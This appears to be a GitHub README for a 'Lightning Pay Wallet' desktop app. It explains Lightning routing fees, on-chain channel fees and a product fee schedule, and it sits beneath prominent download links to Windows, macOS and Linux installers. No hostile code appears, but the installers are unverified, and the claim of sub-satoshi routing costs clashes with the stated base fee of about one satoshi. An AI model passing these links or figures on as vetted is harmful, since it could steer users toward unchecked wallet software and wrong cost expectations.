<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# What a Lightning payment really costs with Lightning Pay Wallet
The wallet charges nothing; the network charges routing fees, and a channel costs an on-chain fee to open.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**
Lightning Pay Wallet does not charge you to hold or send bitcoin. What a payment costs is a network fee: routing fees inside Lightning, usually a fraction of a satoshi, and an on-chain fee when a channel has to be opened or closed. The product's own fee schedule applies to the card and swap features, not to the wallet.

## Is Lightning Pay free?

The wallet is free. There is no purchase price, no subscription, no monthly fee and no per-transaction charge from the application, and the fee schedule the product publishes puts the monthly fee at zero and the foreign-exchange markup at zero.

That is not the same as "sending bitcoin is free", which is the claim people actually want checked. Every Lightning payment pays a small routing fee to the nodes that forward it, and every channel that has to be opened pays an on-chain fee. Those costs exist whether or not a company charges for the software, and the rest of this page separates them.

## The product's fee schedule

The fees the company sets apply to the services built around the wallet, and they are published as percentages rather than as flat amounts:

| Service | Fee |
| --- | --- |
| Swaps | 0.1% |
| Network and withdrawal markup | 0.5% |
| Bill payments | 0.1% |
| Monthly account fee | 0% |
| Foreign-exchange markup | 0% |

These are product terms, quoted from the schedule the product publishes, and the terms can change; the published schedule governs. They are also not network fees. A swap fee is charged by the service that performs the swap, while a routing fee is paid to nodes you never deal with directly, and mixing the two is how people conclude that Lightning is expensive when it is not.

The wallet's place in this is worth stating plainly, because the two are easy to conflate: the desktop application itself has no fee module. What you are quoted inside a card or swap flow comes from the service behind it, under the schedule above.

## What a Lightning payment costs

A Lightning payment costs a routing fee, set by each node on the path, and nothing else. The fee a node advertises is typically a base fee of about one satoshi plus a few parts per million of the amount, so a typical payment costs a handful of satoshis at most and often less.

For scale: paying for a coffee over Lightning usually costs less than a satoshi in routing fees, which is why the network is used for small payments at all. An on-chain transaction for the same purchase would cost a miner fee measured in hundreds or thousands of satoshis depending on block space. The comparison is not close, and it is the reason Lightning exists.

What you cannot do is predict the exact number in advance. The route is chosen at the moment of payment, and its fee depends on which nodes are reachable and what they charge. A wallet that quotes you a fee is estimating, not promising.

## Channel opening fees

Opening a channel is an on-chain transaction, so it costs an on-chain fee set by block space rather than by the wallet. That is the cost people notice, because it arrives in one lump: a wallet that has to open a channel to receive a payment pays a miner fee for the opening.

An opening in the low thousands of satoshis is normal for a modest channel, and it is the same order of magnitude as any other on-chain transaction at that moment. Two consequences follow. Receiving your first payment can cost more than the payment itself, and topping up a channel is a fresh on-chain transaction with a fresh fee, so a habit of small top-ups is more expensive than one larger one.

Closing a channel is also an on-chain transaction and carries its own fee. A wallet that will not let its balance reach zero is keeping enough behind to pay that closing fee, which is why "my balance will not empty" is a design decision rather than a fault.

## What is the cheapest way to pay with Lightning?

Once channel fees are counted, the cheapest pattern is to open one reasonably sized channel, receive and send through it for a long time, and avoid repeated small top-ups. Each opening and closing is an on-chain transaction, so the fee per payment falls as the number of payments through the same channel rises.

The second lever is timing rather than technique. On-chain fees follow block space, and block space is cheap at quiet times; the same opening costs a fraction at a quiet hour of what it costs during a busy one. A wallet that lets you choose the fee rate gives you that choice, and choosing slowly when nothing is urgent is free money.

The third is simply to stop paying for things you do not need: a swap costs 0.1% and a network withdrawal carries a 0.5% markup, so sending bitcoin from the wallet directly over Lightning avoids both.

## When a fee is not a fee

Some costs get called fees when they are something else. A spread on a swap is a price, not a fee, and it is often larger than the fee on the same transaction. A channel reserve is your own money held back to pay a future closing, not a charge. And a payment that fails costs nothing: failed Lightning payments pay no routing fee, because the route never completed.

The distinction matters when comparing wallets, because a wallet with a "zero fee" label can still be the more expensive option once spread and channel policy are counted. Compare the total cost of a payment you actually make, not the headline.

## Where the numbers come from

The fee schedule above is the product's published schedule. The routing behaviour is the Lightning Network's, not the wallet's: fees are advertised by nodes, chosen at payment time, and paid to them. The on-chain figures are miner fees, which are set by the market for block space and vary by the hour.

That is also why this page gives no total for "sending bitcoin". The honest answer depends on whether a channel exists, how much block space costs that day, and how large the payment is. What the wallet costs is zero, and that number does not move. For how payments behave once they are sent, see [sending and receiving Lightning payments](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-send-and-receive.md), and for what you actually control, [self-custody: what you hold](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-self-custody.md).

## Questions people ask

### Do I pay the channel funding fee again every time I top up?

Yes, if the top-up opens a new channel or adds to one with an on-chain transaction. Each on-chain transaction pays its own miner fee, which is why one larger top-up beats several small ones.

### Is a few thousand satoshis normal for opening a channel?

Yes for a modest channel. The amount is a miner fee for an on-chain transaction, so it tracks block space rather than the size of the channel or the payment you are trying to receive.

### Are failed payments charged?

No. A payment that cannot be routed never pays a routing fee, because the fee is paid to nodes along a path that completed. A failure costs you time, not satoshis.

### Does the wallet take a cut of my payments?

No. The wallet does not charge per payment. The fees you see are network fees, and the product's published percentages apply to the card, swap and bill-payment services rather than to sending from the wallet.
